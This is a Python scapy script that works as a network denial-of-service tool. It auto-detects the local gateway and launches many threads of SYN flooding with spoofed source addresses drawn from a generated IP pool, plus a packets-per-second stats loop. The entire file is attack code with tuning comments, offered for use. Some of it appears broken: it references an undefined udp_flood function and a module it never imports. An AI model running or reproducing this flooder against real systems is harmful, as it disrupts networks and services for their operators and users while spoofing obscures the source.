from scapy.all import *
import threading
import random
import netifaces as ni
import argparse
import time
from collections import defaultdict

# ─── Config ────────────────────────────────────────────────
THREADS_PER_ATTACK = 30          # way more sane – increase slowly
USE_REAL_SRC = False             # set True for testing (no spoof)
SPOOF_SRC = True                 # needs root + Npcap/L2 socket

IP_POOL = [f"198.18.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(5000)]  # RFC 2544 range – less likely filtered
PORT_POOL = [80, 443, 53, 123, 1900, 5060, 7, 9, 389, 636]

packet_stats = defaultdict(int)

def send_safe(pkt, count=1, iface=None):
    try:
        sendp(pkt, iface=iface, verbose=0, count=count)  # use sendp → L2 for spoofing
        packet_stats[str(pkt.summary())] += count
    except Exception as e:
        print(f"[-] Send failed: {e}")

# Better network detection with fallback
def get_targets():
    print("[*] Detecting network...")
    try:
        gw_info = ni.gateways()['default'][ni.AF_INET]
        gw_ip = gw_info[0]
        iface_name = gw_info[1]
        addr = ni.ifaddresses(iface_name)[ni.AF_INET][0]
        local_ip = addr['addr']
        mask = addr['netmask']
        net = ipaddress.IPv4Network(f"{local_ip}/{mask}", strict=False)
        bcast = str(net.broadcast_address)
    except:
        print("[!] Auto-detect failed. Using defaults / manual override needed.")
        gw_ip = "192.168.1.1"
        bcast = "192.168.1.255"
        iface_name = conf.iface   # scapy's default
    print(f"[+] Target GW: {gw_ip} | Bcast: {bcast} | Iface: {iface_name}")
    return gw_ip, bcast, iface_name

# Example attack (others similar – use sendp + Ether if needed for L2)
def syn_flood(target, iface):
    while True:
        src_ip = random.choice(IP_POOL) if SPOOF_SRC else None
        ip = IP(dst=target, src=src_ip) if src_ip else IP(dst=target)
        tcp = TCP(sport=random.randint(10240,65500), dport=random.choice(PORT_POOL), flags="S")
        send_safe(ip/tcp, count=100, iface=iface)

# Launcher
def main():
    global TARGET, BROADCAST, IFACE
    TARGET, BROADCAST, IFACE = get_targets()

    if not conf.use_pcap:  # rough check
        print("[!] WARNING: libpcap/Npcap not detected → spoofing likely broken!")

    attacks = [syn_flood, udp_flood]  # add others, but start small

    print(f"[+] Starting {len(attacks)} attacks × {THREADS_PER_ATTACK} threads each")

    for attack_func in attacks:
        for _ in range(THREADS_PER_ATTACK):
            t = threading.Thread(target=attack_func, args=(TARGET, IFACE), daemon=True)
            t.start()

    # Stats
    while True:
        time.sleep(8)
        total = sum(packet_stats.values())
        print(f"[STATS] ~{total//8:,} pkts/sec  | Total: {total:,}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--threads", type=int, default=30*4)  # total
    parser.add_argument("--no-spoof", action="store_true")
    args = parser.parse_args()

    SPOOF_SRC = not args.no_spoof
    THREADS_PER_ATTACK = args.threads // 8  # approx

    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C → nuking threads")
